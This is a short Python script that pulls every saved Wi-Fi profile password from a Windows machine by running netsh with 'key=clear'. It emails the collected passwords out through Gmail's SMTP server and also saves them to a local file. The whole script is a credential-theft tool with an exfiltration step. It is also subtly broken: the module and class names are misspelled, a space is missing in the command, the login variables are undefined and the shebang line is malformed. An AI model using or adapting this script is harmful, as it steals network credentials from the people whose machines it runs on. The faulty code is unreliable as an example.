#/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/24/2021

import subprocess
import smtplib
import re

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
networkList = re.findall('(?:profile\s*:\s)(.*)'  , networks)

finalOutput = ""
for network in networkList:
    showKey = "netsh wlan show profile " + network + "key=clear"
    oneNetworkResult = subprocess.check_output(showKey, shell=True)
    finalOutput += oneNetworkResult

#Have Output Sent as an Email
server = smptlib.smpt("smtp.gmail.com", 587)
server.starttls()
server.login(email,password)
server.sendmail(email, email, finalOutput)

#Have Output Saved to File
file = open("wifiPasswords.txt", "w")
file.write(finalOutput)
file.close()
